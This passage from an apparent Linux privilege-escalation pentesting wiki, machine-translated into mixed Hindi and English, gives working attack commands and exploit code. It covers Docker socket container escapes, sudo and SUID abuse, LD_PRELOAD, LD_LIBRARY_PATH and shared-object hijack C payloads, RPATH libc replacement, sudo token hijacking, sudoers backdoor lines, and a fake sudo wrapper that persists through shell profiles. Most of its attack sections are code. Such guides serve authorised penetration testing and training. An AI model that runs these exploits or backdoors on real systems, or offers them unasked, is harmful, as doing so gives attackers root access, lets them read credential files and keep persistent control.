The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. डिफ़ॉल्ट रूप से, इसे `root` user और `docker` group के सदस्यों द्वारा लिखा जा सकता है. इस socket पर write access होने से privilege escalation हो सकता है. यहाँ बताया गया है कि यह कैसे किया जा सकता है और यदि Docker CLI उपलब्ध नहीं है तो वैकल्पिक तरीके क्या हैं।

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker socket पर write access है, तो आप निम्न commands का उपयोग करके privilege escalation कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड्स आपको host की फ़ाइल सिस्टम पर root-स्तरीय पहुँच के साथ एक कंटेनर चलाने की अनुमति देती हैं।

#### **Docker API का सीधे उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध न हो, Docker socket को फिर भी Docker API और `curl` कमांड्स के जरिए मैनिपुलेट किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** host सिस्टम की root डायरेक्टरी को mount करने वाला एक container बनाने के लिए request भेजें।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` का उपयोग करके container से कनेक्शन बनायें, जिससे उसके अंदर कमांड चलाई जा सकें।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

` s o c a t ` कनेक्शन सेट करने के बाद, आप host के फ़ाइल सिस्टम पर root-स्तरीय पहुँच के साथ container के अंदर सीधे कमांड्स चला सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **group `docker` के अंदर** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

देखें **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप देखेंगे कि आप **`ctr`** कमांड उपयोग कर सकते हैं तो निम्न पन्ना पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप देखेंगे कि आप **`runc`** कमांड उपयोग कर सकते हैं तो निम्न पन्ना पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत **inter-Process Communication (IPC) system** है जो applications को प्रभावी ढंग से interact और डेटा साझा करने में सक्षम बनाती है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन की गई, यह विभिन्न प्रकार की application communication के लिए एक मजबूत फ्रेमवर्क प्रदान करती है।

यह सिस्टम बहुमुखी है, मूल IPC को सपोर्ट करता है जो प्रक्रियाओं के बीच डेटा एक्सचेंज को बढ़ाता है, और यह **enhanced UNIX domain sockets** की याद दिलाता है। इसके अलावा, यह इवेंट्स या सिग्नल्स के ब्रॉडकास्ट में मदद करता है, जिससे सिस्टम कम्पोनेंट्स के बीच सहज एकीकरण बनता है। उदाहरण के तौर पर, एक Bluetooth daemon से आने वाले कॉल का सिग्नल किसी music player को म्यूट करने के लिए प्रेरित कर सकता है, जिससे उपयोगकर्ता अनुभव बेहतर होता है। इसके अतिरिक्त, D-Bus एक remote object system को सपोर्ट करता है, जिससे applications के बीच service requests और method invocations सरल हो जाते हैं, और पारंपरिक रूप से जटिल प्रक्रियाएँ सुगम बनती हैं।

D-Bus एक **allow/deny model** पर चलता है, जो message permissions (method calls, signal emissions, आदि) को match होने वाले policy rules के समेकित प्रभाव के आधार पर प्रबंधित करता है। ये नीतियाँ bus के साथ होने वाली interactions को निर्दिष्ट करती हैं, जो इन permissions के शोषण के माध्यम से privilege escalation की अनुमति दे सकती हैं।

ऐसी नीतियों का एक उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जिसमें root user को `fi.w1.wpa_supplicant1` का मालिक होने, उसे संदेश भेजने और उससे संदेश प्राप्त करने की permissions का विवरण है।

यदि नीतियों में कोई निर्दिष्ट user या group नहीं दिया गया है तो वे सार्वभौमिक रूप से लागू होती हैं, जबकि "default" context नीतियाँ उन सभी पर लागू होती हैं जो अन्य विशिष्ट नीतियों द्वारा कवर नहीं हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ जानें कैसे एक D-Bus communication को enumerate और exploit किया जाए:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करना और मशीन का स्थान पता करना हमेशा रोचक होता है।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

हमेशा उस मशीन पर चल रही network services की जाँच करें जिनके साथ आप उसे एक्सेस करने से पहले इंटरेक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँचें कि क्या आप sniff traffic कर सकते हैं। अगर आप कर पाएँ तो आप कुछ credentials प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## उपयोगकर्ता

### सामान्य सूचीकरण

जाँचें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन **login** कर सकता है और किसके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो उन उपयोगकर्ताओं (जिनका **UID > INT_MAX** है) को विशेषाधिकार उन्नयन करने की अनुमति देता है। More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**इसे एक्सप्लॉइट करें** उपयोग करके: **`systemd-run -t /bin/bash`**

### Groups

जाँचें कि आप किसी ऐसे समूह के सदस्य हैं जो आपको root privileges दे सके:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

यदि संभव हो तो जाँचें कि क्लिपबोर्ड के अंदर कुछ रोचक तो नहीं।
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप **पर्यावरण का कोई भी पासवर्ड** जानते हैं तो उस पासवर्ड का उपयोग करके **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने** का प्रयास करें।

### Su Brute

यदि आप बहुत शोर करने की परवाह नहीं करते और `su` और `timeout` बाइनरी कंप्यूटर पर मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce)\ का उपयोग करके उपयोगकर्ता पर brute-force आज़मा सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` पैरामीटर के साथ भी उपयोगकर्ताओं पर brute-force करने की कोशिश करता है।

## Writable PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप **$PATH के किसी फ़ोल्डर के अंदर लिख सकते हैं** तो आप विशेषाधिकार बढ़ाने में सक्षम हो सकते हैं द्वारा **writable फ़ोल्डर के अंदर एक backdoor बनाकर** जिसका नाम उस कमांड के नाम जैसा होगा जिसे किसी दूसरे उपयोगकर्ता (आदर्श रूप से root) द्वारा execute किया जाएगा और जो **$PATH में आपके writable फ़ोल्डर से पहले स्थित किसी फ़ोल्डर से लोड नहीं किया जाता है**।

### SUDO और SUID

आपको sudo का उपयोग करके कुछ कमांड execute करने की अनुमति हो सकती है, या उन पर suid bit लगा हो सकता है। इसे जांचने के लिए:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित commands आपको read and/or write files या यहाँ तक कि execute a command करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी user को बिना पासवर्ड जाने किसी अन्य user की privileges के साथ कोई कमांड execute करने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है, root directory में एक ssh key जोड़कर या `sh` कॉल करके अब shell प्राप्त करना बहुत सरल है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को कुछ execute करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, **vulnerable** था **PYTHONPATH hijacking** के कारण, स्क्रिप्ट को root के रूप में चलाते समय किसी मनमाना python library को लोड करने के लिए:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep के द्वारा संरक्षित → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (उदा., `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के non-interactive startup व्यवहार का लाभ उठाकर किसी अनुमत कमांड को कॉल करते समय arbitrary code को root के रूप में चला सकते हैं।

- यह क्यों काम करता है: Non-interactive shells के लिए, Bash `$BASH_ENV` का मूल्यांकन करता है और target script को चलाने से पहले उस फ़ाइल को source करता है। कई sudo नियम एक स्क्रिप्ट या shell wrapper चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा संरक्षित है, तो आपकी फ़ाइल root privileges के साथ source की जाएगी।

- आवश्यकताएँ:
- ऐसा sudo नियम जो आप चला सकें (कोई भी लक्ष्य जो गैर-इंटरैक्टिव रूप से `/bin/bash` को invoke करता है, या कोई भी bash script)।
- `BASH_ENV` `env_keep` में मौजूद हो (जाँच के लिए `sudo -l` चलाएँ)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- हार्डनिंग:
- `env_keep` से `BASH_ENV` (और `ENV`) हटाएँ, `env_reset` को प्राथमिकता दें।
- sudo-allowed commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- जब preserved env vars का उपयोग हो तो sudo I/O logging और alerting पर विचार करें।

### Sudo निष्पादन को बायपास करने वाले paths

**Jump** का उपयोग कर अन्य फ़ाइलें पढ़ें या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान हो जाता है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**रोकथाम**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

यदि किसी एक कमांड को **sudo permission** बिना path निर्दिष्ट किए दिया गया है: _hacker10 ALL= (root) less_ तो आप PATH variable बदलकर इसे exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी उपयोग की जा सकती है अगर एक **suid** binary **बिना पथ निर्दिष्ट किए किसी अन्य कमांड को execute करता है (हमेशा _**strings**_ के साथ किसी अजीब SUID binary की सामग्री जाँचें)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

यदि **suid** binary **पथ निर्दिष्ट करते हुए किसी दूसरे कमांड को execute करता है**, तो आप उस कमांड के नाम से **export a function** करने की कोशिश कर सकते हैं जिसे suid फ़ाइल कॉल कर रही है।

उदाहरण के लिए, यदि एक suid binary _**/usr/sbin/service apache2 start**_ को कॉल करता है, तो आपको वह function बनाकर export करने की कोशिश करनी चाहिए:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid binary को कॉल करेंगे, यह फ़ंक्शन निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग एक या अधिक साझा लाइब्रेरीज़ (.so files) को निर्दिष्ट करने के लिए किया जाता है, जिन्हें loader द्वारा सभी अन्य लाइब्रेरीज़ के पहले लोड किया जाता है, जिनमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को एक लाइब्रेरी का preloading कहा जाता है।

हालाँकि, सिस्टम सुरक्षा बनाए रखने और इस सुविधा के दुरुपयोग को रोकने के लिए, खासकर suid/sgid executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- जिन executables में real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते, उनके लिए loader **LD_PRELOAD** को अनदेखा करता है।
- suid/sgid वाले executables के लिए, केवल वे libraries preloaded की जाती हैं जो standard paths में हों और जो खुद भी suid/sgid हों।

Privilege escalation हो सकती है अगर आपके पास `sudo` के साथ कमांड चलाने की क्षमता है और `sudo -l` के आउटपुट में **env_keep+=LD_PRELOAD** शामिल है। यह कॉन्फ़िगरेशन **LD_PRELOAD** environment variable को स्थायी रखने और `sudo` के साथ कमांड चलाने पर भी पहचाने जाने की अनुमति देता है, जिससे संभावित रूप से उच्च अधिकारों के साथ arbitrary code का निष्पादन हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
के रूप में सहेजें **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **इसे संकलित करें**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाते हुए
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc का दुरुपयोग किया जा सकता है यदि आक्रमणकारी **LD_LIBRARY_PATH** env variable को नियंत्रित करता है क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी binary को **SUID** permissions के साथ देखा जाए जो असामान्य लगे, तो यह अच्छी प्रैक्टिस है कि यह जांचा जाए कि यह ठीक से **.so** files लोड कर रहा है या नहीं। इसे निम्नलिखित कमांड चलाकर जांचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलना संभावित exploitation का संकेत देता है।

इसे exploit करने के लिए, आप एक C फ़ाइल बनाएँगे, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित code होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह कोड, एक बार compiled और executed होने पर, file permissions को manipulate करके और elevated privileges के साथ एक shell execute करके privileges बढ़ाने का प्रयास करता है।

ऊपर दिए गए C file को एक shared object (.so) file में compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने पर exploit ट्रिगर होना चाहिए, जिससे संभावित system compromise संभव हो सके।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो किसी folder से library लोड कर रहा है जहाँ हम write कर सकते हैं, तो उस folder में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको निम्नलिखित जैसी कोई त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) एक curated list है Unix binaries का जिन्हें एक attacker उपयोग कर सकते हैं स्थानीय सुरक्षा प्रतिबंधों को bypass करने के लिए। [**GTFOArgs**](https://gtfoargs.github.io/) समान है लेकिन उन मामलों के लिए जहाँ आप कमांड में **only inject arguments** कर सकते हैं।

प्रोजेक्ट Unix बाइनरीज़ के वैध फ़ंक्शन्स को कलेक्ट करता है जिन्हें abuse करके break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, और अन्य post-exploitation tasks में सहायता की जा सके।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` को access कर सकते हैं तो आप टूल [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग कर सकते हैं यह चेक करने के लिए कि क्या यह किसी sudo नियम को exploit करने का तरीका पाता है।

### Reusing Sudo Tokens

ऐसे मामलों में जहाँ आपके पास **sudo access** है लेकिन पासवर्ड नहीं है, आप privileges escalate कर सकते हैं **waiting for a sudo command execution and then hijacking the session token** करके।

Requirements to escalate privileges:

- आप पहले से user _sampleuser_ के रूप में एक shell रखते हैं
- _sampleuser_ ने **used `sudo`** करके पिछले **15mins** में कुछ execute किया हो (डिफ़ॉल्ट रूप से यही sudo token की अवधि है जो हमें `sudo` बिना पासवर्ड के उपयोग करने देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` का मान 0 होना चाहिए
- `gdb` accessible होना चाहिए (आप इसे अपलोड कर सकें)

(आप अस्थायी रूप से `ptrace_scope` को `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` चलाकर सक्षम कर सकते हैं या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को संशोधित करके और `kernel.yama.ptrace_scope = 0` सेट करके)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- यह **second exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root के स्वामित्व वाला और setuid** होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) **sudoers file बनाएगा** जो **sudo tokens को स्थायी बनाता है और सभी users को sudo इस्तेमाल करने की अनुमति देता है**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि उस फ़ोल्डर में या फ़ोल्डर के भीतर बनाए गए किसी भी फ़ाइल पर आपके पास **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **create a sudo token for a user and PID** कर सकते हैं.\
उदाहरण के लिए, यदि आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 के साथ एक shell है, तो आप बिना password जाने **obtain sudo privileges** कर सकते हैं doing:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फाइलें यह निर्धारित करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। **डिफ़ॉल्ट रूप से ये फाइलें केवल user root और group root द्वारा पढ़ी जा सकती हैं**.\
**यदि** आप इस फाइल को **पढ़** सकते हैं तो आप कुछ रोचक जानकारी **प्राप्त** कर पाएंगे, और यदि आप किसी भी फाइल को **लिख** सकते हैं तो आप **escalate privileges** कर पाएंगे.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं, तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन अनुमतियों का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD के लिए `sudo` बाइनरी के कुछ विकल्प हैं, जैसे `doas` — इसकी कॉन्फ़िगरेशन को `/etc/doas.conf` में जांचना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **user सामान्यतः किसी machine से कनेक्ट करता है और privileges बढ़ाने के लिए `sudo` का उपयोग करता है** और आपने उस user context में shell हासिल कर लिया है, तो आप **एक नया sudo executable बना सकते हैं** जो पहले आपका कोड root के रूप में चलाएगा और फिर user का कमांड। उसके बाद user context का **$PATH** बदल दें (उदाहरण के लिए नई path को .bash_profile में जोड़कर), ताकि जब user sudo चलाए तो आपका sudo executable execute हो।

ध्यान दें कि यदि user किसी अलग shell (not bash) का उपयोग करता है तो आपको नई path जोड़ने के लिए अन्य files को modify करना होगा। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को modify करता है। आप [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में एक और उदाहरण पा सकते हैं

या कुछ इस तरह चलाना:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है **कि लोड की गई कॉन्फ़िगरेशन फाइलें कहाँ से आ रही हैं**। आम तौर पर, इस फाइल में निम्नलिखित path होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फाइलें **अन्य फ़ोल्डरों की ओर इशारा करती हैं** जहाँ **लाइब्रेरी** **खोजी** जाएँगी। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर लाइब्रेरी खोजेगा**।

यदि किसी कारणवश किसी user के पास बताए गए किसी भी path पर **write permissions** हैं: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल या `/etc/ld.so.conf.d/*.conf` के अंदर config फाइल में बताए किसी भी फ़ोल्डर पर, तो वह privileges escalate कर सकता है.\
निम्न पृष्ठ में देखें **how to exploit this misconfiguration**:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर यह प्रोग्राम द्वारा `RPATH` वैरिएबल में निर्दिष्ट इस स्थान पर उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में एक दुर्भावनापूर्ण लाइब्रेरी बनाएं, इसके लिए चलाएँ `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities किसी प्रक्रिया को उपलब्ध **root privileges का एक subset** प्रदान करते हैं। यह प्रभावी रूप से **root privileges को छोटे और विशिष्ट इकाइयों में विभाजित** कर देता है। इनमें से प्रत्येक इकाई को स्वतंत्र रूप से प्रक्रियाओं को दिया जा सकता है। इस तरह पूरे privileges का सेट कम हो जाता है, जिससे exploitation के जोखिम घटते हैं.\
निम्न पृष्ठ पढ़ें ताकि आप **क्षमताएँ और उन्हें दुरुपयोग करने के तरीकों के बारे में और अधिक जान सकें**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

किसी डायरेक्टरी में, **"execute" बिट** यह संकेत देता है कि प्रभावित उपयोगकर्ता उस फ़ोल्डर में "**cd**" कर सकता है.\
**"read"** बिट का अर्थ है कि उपयोगकर्ता फ़ाइलों की सूची देख सकता है, और **"write"** बिट का अर्थ है कि उपयोगकर्ता फ़ाइलों को हटाने और नई फ़ाइलें बनाने में सक्षम है।

## ACLs

Access Control Lists (ACLs) विवेकानुसार अनुमतियों की द्वितीयक परत का प्रतिनिधित्व करते हैं, जो पारंपरिक ugo/rwx permissions को **override** करने में सक्षम हैं। ये permissions फ़ाइल या डायरेक्टरी एक्सेस पर नियंत्रण बढ़ाते हैं क्योंकि वे उन विशिष्ट उपयोगकर्ताओं को अधिकार देने या न देने की अनुमति देते हैं जो मालिक नहीं हैं या समूह का हिस्सा नहीं हैं। यह स्तर **सूक्ष्मता सुनिश्चित करता है और अधिक सटीक एक्सेस प्रबंधन प्रदान करता है**। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

